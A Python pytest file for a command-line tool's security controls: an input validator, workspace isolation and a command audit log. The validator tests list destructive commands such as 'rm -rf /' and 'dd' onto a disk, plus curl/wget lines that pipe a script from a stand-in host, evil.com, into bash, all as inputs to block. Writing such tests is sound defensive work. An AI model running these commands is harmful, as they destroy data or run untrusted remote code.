"""Tests for security controls."""

import pytest
from pathlib import Path

from orchestro_cli.testing.security import (
    InputValidator,
    WorkspaceIsolator,
    CommandAuditor,
)


class TestInputValidator:
    """Test input validation for dangerous commands."""

    def test_blocks_rm_commands(self):
        """Test that rm commands are blocked."""
        validator = InputValidator()

        with pytest.raises(ValueError, match="blocked"):
            validator.validate_command("rm -rf /")

        with pytest.raises(ValueError, match="blocked"):
            validator.validate_command("rm something")

    def test_blocks_destructive_commands(self):
        """Test blocking of destructive commands."""
        validator = InputValidator()

        blocked = [
            "mkfs /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            "shutdown now",
            "reboot",
            "sudo something",
            "kill 1",
        ]

        for cmd in blocked:
            with pytest.raises(ValueError, match="blocked"):
                validator.validate_command(cmd)

    def test_blocks_dangerous_patterns(self):
        """Test blocking of dangerous patterns."""
        validator = InputValidator()

        dangerous = [
            "wget http://evil.com/script | bash",
            "curl http://evil.com/script | bash",
            "eval $(malicious)",
            "> /dev/sda",
        ]

        for cmd in dangerous:
            with pytest.raises(ValueError, match="dangerous pattern"):
                validator.validate_command(cmd)

    def test_allows_safe_commands(self):
        """Test that safe commands pass validation."""
        validator = InputValidator()

        safe = [
            "echo hello",
            "ls -la",
            "cat file.txt",
            "grep pattern file",
            "git status",
            "npm install",
        ]

        for cmd in safe:
            validator.validate_command(cmd)  # Should not raise

    def test_strict_mode_blocks_background_jobs(self):
        """Test that strict mode blocks background jobs."""
        validator = InputValidator(strict=True)

        with pytest.raises(ValueError, match="Background jobs"):
            validator.validate_command("long_running_command &")

    def test_strict_mode_blocks_etc_writes(self):
        """Test that strict mode blocks writes to /etc."""
        validator = InputValidator(strict=True)

        with pytest.raises(ValueError, match="/etc/"):
            validator.validate_command("echo something > /etc/config")

    def test_non_strict_allows_more(self):
        """Test that non-strict mode is more permissive."""
        validator = InputValidator(strict=False)

        # These would be blocked in strict mode
        validator.validate_command("sleep 10")  # Should not raise


class TestWorkspaceIsolator:
    """Test workspace isolation."""

    def test_creates_workspace(self, temp_workspace):
        """Test workspace creation."""
        isolator = WorkspaceIsolator(temp_workspace)

        workspace = isolator.create_workspace("test-workspace")

        assert workspace.exists()
        assert workspace.is_dir()
        assert (workspace / "home").exists()
        assert (workspace / "data").exists()
        assert (workspace / "tmp").exists()

    def test_sanitizes_workspace_names(self, temp_workspace):
        """Test that workspace names are sanitized."""
        isolator = WorkspaceIsolator(temp_workspace)

        workspace = isolator.create_workspace("test/workspace with spaces!")

        # Name should be sanitized
        assert workspace.name == "test_workspace_with_spaces_"

    def test_workspace_cleanup(self, temp_workspace):
        """Test workspace cleanup."""
        isolator = WorkspaceIsolator(temp_workspace)

        workspace = isolator.create_workspace("cleanup-test")
        assert workspace.exists()

        # Add some files
        (workspace / "test.txt").write_text("test")

        isolator.cleanup_workspace(workspace)
        assert not workspace.exists()

    def test_cleanup_only_within_base(self, temp_workspace):
        """Test that cleanup only works within base directory."""
        isolator = WorkspaceIsolator(temp_workspace)

        # Try to clean up something outside base dir
        outside_path = Path("/tmp/random_dir")
        isolator.cleanup_workspace(outside_path)

        # Should silently ignore (not crash)


class TestCommandAuditor:
    """Test command auditing."""

    def test_logs_commands(self):
        """Test that commands are logged."""
        auditor = CommandAuditor()

        auditor.log_command("echo hello")
        auditor.log_command("ls -la")
        auditor.log_command("git status")

        log = auditor.get_audit_log()
        assert len(log) == 3

        # Check commands are in log
        commands = [cmd for _, cmd in log]
        assert "echo hello" in commands
        assert "ls -la" in commands
        assert "git status" in commands

    def test_includes_timestamps(self):
        """Test that timestamps are included."""
        auditor = CommandAuditor()

        auditor.log_command("test command")

        log = auditor.get_audit_log()
        timestamp, command = log[0]

        assert timestamp  # Should have a timestamp
        assert command == "test command"

    def test_writes_to_file(self, temp_workspace):
        """Test writing audit log to file."""
        log_file = temp_workspace / "audit.log"
        auditor = CommandAuditor(log_file=log_file)

        auditor.log_command("command 1")
        auditor.log_command("command 2")

        # Verify file was created and has content
        assert log_file.exists()
        content = log_file.read_text()
        assert "command 1" in content
        assert "command 2" in content

    def test_get_audit_log_returns_copy(self):
        """Test that audit log returns a copy."""
        auditor = CommandAuditor()

        auditor.log_command("test")
        log1 = auditor.get_audit_log()
        log2 = auditor.get_audit_log()

        # Should be equal but not same object
        assert log1 == log2
        assert log1 is not log2
